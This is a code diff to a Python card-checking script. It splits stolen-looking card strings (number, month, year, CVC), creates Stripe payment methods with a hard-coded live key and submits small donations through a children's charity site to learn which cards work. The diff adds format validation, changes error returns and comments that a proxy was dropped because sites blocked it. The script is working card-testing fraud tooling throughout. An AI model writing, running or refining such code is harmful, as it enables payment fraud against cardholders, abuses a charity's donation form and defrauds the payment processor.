@@ -2,6 +2,7 @@ import requests
 from bs4 import BeautifulSoup
 import random
 import string
+
 def find_between(data, start, end):
     try:
         star = data.index(start) + len(start)
@@ -51,10 +52,19 @@ mail = "cristniki" + str(random.randint(9999, 574545))+"@gmail.com"
 def Tele(ccx):
     import requests
     ccx = ccx.strip()
-    n = ccx.split("|")[0]
-    mm = ccx.split("|")[1]
-    yy = ccx.split("|")[2]
-    cvc = ccx.split("|")[3]
+
+    # Split and validate card data format
+    parts = ccx.split("|")
+    if len(parts) < 4:
+        return ["❌ Invalid card format. Expected format: CARD|MM|YY|CVC"]
+
+    try:
+        n = parts[0]
+        mm = parts[1]
+        yy = parts[2]
+        cvc = parts[3]
+    except IndexError:
+        return ["❌ Invalid card format. Missing required fields."]
     if "20" in yy:
         yy = yy.split("20")[1]
     r = requests.session()
@@ -76,6 +86,7 @@ def Tele(ccx):
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
     }
 
+    # Proxy removed due to site blocking issues
     response = requests.get('https://needhelped.com/campaigns/poor-children-donation-4/donate/', headers=headers)
     nonce = gets(response.text, '<input type="hidden" name="_charitable_donation_nonce" value="', '"  />')
     # print(nonce)
@@ -122,6 +133,7 @@ def Tele(ccx):
         'key': 'pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr',
     }
 
+    # Use direct connection for Stripe API (proxy blocks financial sites)
     response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
     id = response.json()['id']
     # print(id)
@@ -171,20 +183,17 @@ def Tele(ccx):
         'form_action': 'make_donation',
     }
 
+    # Use direct connection (proxy blocks sites)
     response = requests.post('https://needhelped.com/wp-admin/admin-ajax.php', headers=headers, data=data)
     print(response.text)
 
     try:
         json_data = response.json()
         if 'errors' in json_data:
-            # Return the first error message as a string
-            if isinstance(json_data['errors'], list) and len(json_data['errors']) > 0:
-                return json_data['errors'][0]
-            else:
-                return str(json_data['errors'])
+            return json_data['errors']
         else:
             return "succeeded"
     except ValueError:
-        return "❌ Invalid JSON Response"
+        return ["❌ Invalid JSON Response", response.text]
     except Exception as e:
-        return f"❌ Error: {str(e)}"
+        return [f"❌ Error: {str(e)}"]
